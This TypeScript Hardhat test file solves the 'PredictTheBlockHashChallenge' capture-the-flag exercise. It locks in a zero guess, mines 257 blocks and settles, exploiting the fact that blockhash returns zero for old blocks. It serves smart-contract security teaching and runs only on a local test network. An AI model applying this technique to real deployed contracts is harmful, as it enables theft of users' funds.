import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { mine } from "@nomicfoundation/hardhat-network-helpers";
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils, provider } = ethers;

describe('PredictTheBlockHashChallenge', () => {
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;
  let target: Contract;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('PredictTheBlockHashChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    const tx = await target.lockInGuess(`0x${'0'.repeat(64)}`, { value: utils.parseEther('1') });
    await tx.wait();

    const initialBlockNumber = await provider.getBlockNumber();

    for(let i=0; i < 257; i++) {
    // Mine the next 257 blocks
      await mine();
    }

    // This hack works because if you ask for block.blockhash(i) of a block that is older than 256 most recent blocks,
    // you get back 0.

    const tx2 = await target.settle();
    await tx2.wait();

    expect(await target.isComplete()).to.equal(true);
  });
});
